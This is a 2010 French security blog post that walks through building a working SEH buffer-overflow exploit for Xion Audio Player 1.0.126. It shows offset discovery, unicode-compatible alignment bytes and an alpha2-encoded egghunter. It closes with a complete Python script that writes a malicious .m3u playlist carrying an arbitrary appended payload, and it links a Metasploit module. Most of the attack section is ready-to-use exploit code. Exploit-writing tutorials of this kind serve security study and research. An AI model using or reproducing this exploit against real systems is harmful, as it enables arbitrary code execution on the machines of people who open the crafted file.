<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[Exploit] Xion Audio Player 1.0.126 Buffer Overflow Vulnerability</title>
  <meta name="description" content="[UPDATE : 30/11/2010] : corelanc0d3r backlinking + explication rapide sur egghunting + msf exploit module link">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="/2010/11/30/exploit-xion-audio-player-10126-buffer.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[Exploit] Xion Audio Player 1.0.126 Buffer Overflow Vulnerability</h1>
    <p class="post-meta"><time datetime="2010-11-30T01:37:00+01:00" itemprop="datePublished">Nov 30, 2010</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><b><span style="color: red;">[UPDATE : 30/11/2010] : corelanc0d3r backlinking + explication rapide sur egghunting + msf exploit module link</span></b></p>

<p>Bonsoir,</p>

<p>On voit souvent des vulnérabilitées étant classifiées comme des DOS, c’est assez courant mine de rien.
Aujourd’hui, je me balade sur <a href="http://www.exploit-db.com/">Exploit-DB</a> et je tombe sur ce DOS là : <a href="http://www.exploit-db.com/exploits/15598/">ici</a> .</p>

<p>Let’s hack it! ^^</p>

<h1 id="trigger-it">Trigger it</h1>

<p>Assez courant ces fichiers avec pleins de ‘A’ ;).</p>

<p>La première chose à faire est de savoir si on a un EIP ou un SEH overwrite :).</p>

<p>On génère notre fichier .m3u avec metasploit :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>m_101@m_101-laptop:~/repos/msf<span class="nv">$ </span>tools/pattern_create.rb 10240 &lt; ~/shared/msfpattern.m3u</pre></td></tr></tbody></table></code></pre></figure>

<p>On ouvre dans la “playlist” dans le lecteur.</p>

<p>Crash!</p>

<p><img src="/assets/img/xion_exploit_crash.png" alt="Xion Player Crash" /></p>

<p>Oo de l’unicode dans notre SEH!! :)</p>

<p>On cherche l’offset avec <a href="http://redmine.corelan.be:8800/projects/pvefindaddr">pvefindaddr</a> :</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>!pvefindaddr suggest</pre></td></tr></tbody></table></code></pre></figure>

<p><img src="/assets/img/xion_exploit_offset.png" alt="Xion Player Offset" /></p>

<p>Et hop, on écrase le seh au bout de 263 octets (j’avais trouvé 252 au départ bizarrement … testez ça marche encore avec mon sploit python ;)).
<b><span style="color: red;">[EDIT] : L’offset change selon la longueur du path où se trouve le fichier mais ne dépend aucunement de la longueur du nom de fichier. Ici on trouve 263 car le fichier evil.m3u se trouve à la racine d’un disque.</span></b></p>

<p>Passons maintenant à la phase cassage du soft :).</p>

<h1 id="hack-it">Hack it!</h1>

<p>On cherche une address de type ppr mais manque de pot, y’en a aucune qui est compatible unicode :(.</p>

<p><a href="http://redmine.corelan.be:8800/projects/pvefindaddr">pvefindaddr</a> est mine de rien un outil puissant … il nous sauve la mise en nous trouvant un pointeur vers une instruction équivalente :</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>!pvefindaddr a</pre></td></tr></tbody></table></code></pre></figure>

<p>ce qui nous donne plusieurs pointeurs dont 0x00510043.</p>

<p>On a donc :</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="c1"># 51            push ecx</span>
<span class="c1"># 00 43 00      add byte [ebx], al  ; nop</span>
<span class="n">seh</span> <span class="o">=</span> <span class="s1">'\x51\x43'</span>    <span class="c1"># add esp, 8 | ret</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Il nous faut donc que EBX pointe vers une addresse écrivable. 
En regardant notre pile, on voit que l’adresse empilée correspond à une addresse de stack =&gt; addresse écrivable.</p>

<p><img src="/assets/img/xion_exploit_debug_payload.png" alt="Xion Player Payload" /></p>

<p>Ce qui nous donne donc :</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="c1"># 5b            pop ebx</span>
<span class="c1"># 00 43 00      add byte [ebx], al  ; nop</span>
<span class="n">nseh</span> <span class="o">=</span> <span class="s1">'\x5b\x43'</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Dans notre screen précédent, on remarque aussi qu’il faut 2 pop avant d’atteindre un pointeur vers notre buffer unicode :). On va baser notre payload unicode sur ESP. Ca nous donne donc ça :</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c1"># 5a            pop edx</span>
<span class="c1"># 00 43 00      add byte [ebx], al</span>
<span class="n">align</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x5a\x43</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">2</span>
<span class="c1"># 5c            pop esp</span>
<span class="c1"># 00 43 00      add byte [ebx], al</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x5c\x43</span><span class="s2">"</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Il ne reste donc plus qu’à aligner notre pile correctement. Pour celà, l’instruction popad est très pratique, elle dépile 8*4 = 32 octets pour un octet de code (4 si on compte le nop).</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="err">#</span> <span class="mi">61</span>            <span class="k">popad</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ecx],</span> <span class="n">al</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x61\x41</span><span class="s">"</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Vu qu’on pointe sur le début de notre buffer unicode, il faut donc qu’on y mettre 32 octets au mieux :).</p>

<p>Par contre, on a un problème à résoudre avant car les nops qu’on utilise ont la forme :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="k">add</span> <span class="p">[reg1],</span> <span class="n">reg2</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Il faut donc que reg1 pointe vers une addresse valide … hors on détruit nos registres avec popad. Pour trouver notre addresse, on va utiliser la vue “Memory” (Alt+M) de Immunity DBG.</p>

<p><img src="/assets/img/xion_exploit_memory_view.png" alt="Xion Player Memory View" /></p>

<p>On trouve 3 plage intéressantes : numériques ;).</p>

<p>Ca nous donne donc ça :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="err">#</span> <span class="mi">37</span>            <span class="k">aaa</span>                     <span class="c">; clear al bit 4 to 7</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">38</span>         <span class="k">add</span> <span class="n">byte</span> <span class="p">[eax],</span> <span class="n">bh</span>      <span class="c">; eax = 0x00390001 (rw)</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ecx],</span> <span class="n">al</span>      <span class="c">; ecx = 0x00380037 (rw)</span>
<span class="err">#</span> <span class="mi">39</span> <span class="mi">00</span>         <span class="k">cmp</span> <span class="n">dword</span> <span class="p">[eax],</span> <span class="n">eax</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x37\x38</span><span class="s">"</span>   <span class="c">; ecx</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x39</span><span class="s">"</span>   <span class="c">; eax</span></pre></td></tr></tbody></table></code></pre></figure>

<p>On a finit de construire notre code d’alignement :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="code"><pre><span class="err">#</span> <span class="n">alignment</span> <span class="n">code</span>
<span class="err">#</span> <span class="mi">5</span><span class="n">a</span>            <span class="k">pop</span> <span class="n">edx</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">43</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ebx],</span> <span class="n">al</span>
<span class="n">align</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x5a\x43</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>
<span class="err">#</span> <span class="mi">5</span><span class="n">c</span>            <span class="k">pop</span> <span class="n">esp</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">43</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ebx],</span> <span class="n">al</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5c\x43</span><span class="s">"</span>
<span class="err">#</span> <span class="mi">61</span>            <span class="k">popad</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ecx],</span> <span class="n">al</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x61\x41</span><span class="s">"</span>
<span class="err">#</span> <span class="n">junk</span> <span class="n">code</span> <span class="n">just</span> <span class="n">for</span> <span class="n">alignment</span>
<span class="err">#</span> <span class="mi">37</span>            <span class="k">aaa</span>                     <span class="c">; clear al bit 4 to 7</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">38</span>         <span class="k">add</span> <span class="n">byte</span> <span class="p">[eax],</span> <span class="n">bh</span>      <span class="c">; eax = 0x00390001 (rw)</span>
<span class="err">#</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>      <span class="k">add</span> <span class="n">byte</span> <span class="p">[ecx],</span> <span class="n">al</span>      <span class="c">; ecx = 0x00380037 (rw)</span>
<span class="err">#</span> <span class="mi">39</span> <span class="mi">00</span>         <span class="k">cmp</span> <span class="n">dword</span> <span class="p">[eax],</span> <span class="n">eax</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x37\x38</span><span class="s">"</span>     <span class="err">#</span> <span class="n">ecx</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x39</span><span class="s">"</span>     <span class="err">#</span> <span class="n">eax</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Vous mettez le sploit unicode (encodé avec alpha2) et tout devrait rouler ;).
N’oubliez pas de modifier le deuxième byte de la payload alpha2 avec ‘a’ (ecx) car sinon vous aurez un bon plantage (ebp pointe pas vers une bonne addresse).
Au final, on finit avec un beau sploit ;).</p>

<h1 id="egghunting">Egghunting?</h1>

<p>Avoir la possibilitée d’encoder nos payloads avec l’encodeur alpha2 est somme tout assez pratique mais on se rend compte que niveau taille c’est pas trop ça …
Comme vous le savez sûrement, il y a plusieurs techniques pour contourner les problèmes de tailles telles que le staging ou encore le egghunting.</p>

<p>Le egghunting consiste à chercher notre payload principale plus grosse en mémoire à l’aide d’une première payload de recherche.
Le paper de <a href="/assets/others/egghunt-shellcode.pdf">skape</a> explique clairement le principe qui se résume aux étapes suivante :</p>

<ol>
  <li>recherche d’une adresse mémoire valide (et lisible), si fail, on boucle sur 1
En effet, si nous essayons de lire une addresse mémoire non valide, nous aurons un plantage de la payload et donc un arrêt de notre exécution de code.</li>
  <li>vérification si le tag correspond (on boucle sur 1 si fail)
Le tag doit être unique, pour celà skape utilise un tag de 8 octets.</li>
  <li>exécution de la payload
Une fois le tag trouvé, on a un beau jmp vers celui-ci :).</li>
</ol>

<p>Parfois on peut rencontrer des problèmes avec les egghunters telle que de multiples copies de la payload principale en mémoire (et certaines corrompues). La solution est de changer l’adresse de départ du egghunter ;).</p>

<p>corelanc0d3r a écrit un article entier sur le sujet sous forme de tutoriel : <a href="http://www.corelan.be:8800/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">Exploit writing : Egghunting on Windows</a>.</p>

<p>Et voilà now on a toutes les briques pour notre sploit’ ^^.</p>

<h1 id="sploit-it">Sploit it!</h1>

<p>Voilà mon deuxième exploit unicode ^^ :</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: </span><span class="si">%</span><span class="s">s payload output"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">trigger1</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">252</span>
<span class="c1"># skape NtDisplayString egghunter : alpha2 --unicode esp &lt; egghunter.bin
</span><span class="n">hunter</span> <span class="o">=</span> <span class="s">'TaYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBove1GZyolOa2Nr1Za3NxhMlnMlYuNzptjOwHr0mqr70NriVwfOqeJJvOBUYWKOk7A'</span>
<span class="c1"># egghunter tag
</span><span class="n">tag</span> <span class="o">=</span> <span class="s">'PAWN'</span> <span class="o">*</span> <span class="mi">2</span>

<span class="c1"># 5b            pop ebx
# 00 43 00      add byte [ebx], al
</span><span class="n">nseh</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x5b\x43</span><span class="s">'</span>
<span class="c1"># 51            push ecx
# 00 43 00      add byte [ebx], al
</span><span class="n">seh</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x51\x43</span><span class="s">'</span>    <span class="c1"># add esp, 8 | ret
</span>
<span class="c1"># alignment code
# 5a            pop edx
# 00 43 00      add byte [ebx], al
</span><span class="n">align</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x5a\x43</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>
<span class="c1"># 5c            pop esp
# 00 43 00      add byte [ebx], al
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5c\x43</span><span class="s">"</span>
<span class="c1"># 61            popad
# 00 41 00      add byte [ecx], al
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x61\x41</span><span class="s">"</span>
<span class="c1"># junk code just for alignment
# 37            aaa                     ; clear al bit 4 to 7
# 00 38         add byte [eax], bh      ; eax = 0x00390001 (rw)
# 00 41 00      add byte [ecx], al      ; ecx = 0x00380037 (rw)
# 39 00         cmp dword [eax], eax
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x37\x38</span><span class="s">"</span>     <span class="c1"># ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x39</span><span class="s">"</span>     <span class="c1"># eax
</span>
<span class="c1"># make str long enough to trigger
</span><span class="n">trigger2</span> <span class="o">=</span> <span class="s">'B'</span> <span class="o">*</span> <span class="mi">3000</span>

<span class="n">output</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
<span class="n">egg</span> <span class="o">=</span> <span class="n">trigger1</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">align</span> <span class="o">+</span> <span class="n">hunter</span> <span class="o">+</span> <span class="n">trigger2</span> <span class="o">+</span> <span class="n">tag</span>
<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">egg</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>

<h1 id="sploit-dev-is-expensive">Sploit dev is expensive!</h1>

<p>Sinon, je lis souvent qu’un sploit ça peut coûter cher à développer,  voilà le temps que ça m’a mis : 2h20 pour le sploit original + 25  minutes pour le module msf et 45 minutes pour écrire l’article, soit  3h30.
Si on compte un forfait mensuel de 300€ pour de la main  d’oeuvre pas cher (Chine par exemple) travaillant 20 jours mensuellement  avec 10h par jour, ça nous fait 5.25€ :).
Bon j’exagère, je  compte pas le temps pour trouver la vulnérabilitiée et pas tous le monde  sait coder un exploit (y’a quand même beaucoup de gens :)).
Un bon sploit déveur est apparemment rémunéré dans les 250k/an, ce qui nous donnerais 364.6€ de développement.
On parle ici que d’une seule vuln’ et d’un seul développeur, avec le fuzzing et si vous rajouter le développement d’un framework derrière … ça monte assez vite.</p>

<h1 id="lets-conclude">Let’s conclude!</h1>

<p>J’ai écrit un module msf aussi, dès qu’il sera publié, j’updaterais le post avec le lien du sploit ;).
Après considération, on se rend compte qu’en utilisant l’encodeur alpha2, le plus important est de pouvoir aligner notre code ensuite le décodeur fait tous le boulot ;).</p>

<p>Have fun,</p>

<p>m_101</p>

<p>Liens :</p>

<ul>
  <li><a href="http://www.corelan.be:8800/index.php/2010/11/13/offensive-security-exploit-weekend/">Foxit reader exploitation (Sud0)</a></li>
  <li><a href="http://binholic.blogspot.com/2010/11/exploitation-foxit-reader-411-unicode.html">Foxit reader exploitation (m_101)</a></li>
  <li><a href="http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/">Peter Van Eeckoutte’s Exploit writing : Unicode exploitation&lt;/a&gt;</a></li>
  <li><a href="https://www.metasploit.com/redmine/projects/framework/repository/revisions/11182/entry/modules/exploits/windows/fileformat/xion_m3u_sehbof.rb">Xion Audio Player 1.0.126 MSF Exploit module</a></li>
</ul>

  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/2010/11/20/tips-and-tools-for-linux-and-windows.html">Previous : Tips and tools for Linux and Windows</a>
    

    
    <a class="post-next" href="/2010/12/11/exploit-powershell-301-0day.html">Next : [Exploit] PowerShell 3.01 0day</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://localhost:4000/2010/11/30/exploit-xion-audio-player-10126-buffer.html";
            this.page.identifier = "/2010/11/30/exploit-xion-audio-player-10126-buffer";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
